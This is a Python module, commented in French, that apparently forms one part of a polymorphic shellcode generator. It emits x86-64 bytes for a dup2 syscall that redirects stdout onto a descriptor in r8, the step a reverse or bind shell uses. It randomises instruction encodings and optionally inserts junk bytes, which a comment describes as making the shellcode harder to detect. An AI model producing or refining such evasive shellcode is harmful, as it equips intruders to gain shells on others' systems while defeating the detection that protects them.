#!/usr/bin/env python3
import random
from func_instru import *

def partie4(fullrdm):

    # PARTIE : STDOUT - DUP_FILE_DESCRIPTOR
    ## Exemple de code asm : 
    """
	mov al, 33
	push r8
	pop rdi
	mov sil, 1
	syscall
    """

    x = random.randint(0, 1)

    if x == 0:
        resultat = movx('al', 33) # mov al , 33 - (ou équivalent)
    else :
        rdmxor = randomxor('al') # xor al , al - (ou équivalent)
        moval = movx('al', 33) # mov al , 33 - (ou équivalent)
        resultat = rdmxor + moval

    pushr8 = '\\x41\\x50' # push r8
    poprdi = '\\x5f' # pop rdi
    movsil = movx('sil',1) # mov sil, 1 - (ou équivalent)
    syscall = '\\x0f\\x05' # syscall

    resultat_concat = resultat + pushr8 + poprdi + movsil + syscall

    # Ajout d'aléatoire si l'argument --random = yes
    ### Cette section brise certains motifs pour rendre le shellcode plus difficile à détecter.
    if fullrdm == 'yes':
        y = random.randint(0, 2)
        
        match y : 
            case 1 :
                resultat_concat = resultat + full_random() + pushr8 + poprdi + movsil + syscall
            case 2 : 
                resultat_concat = full_random() + resultat + pushr8 + full_random() + poprdi + movsil + syscall

    return resultat_concat

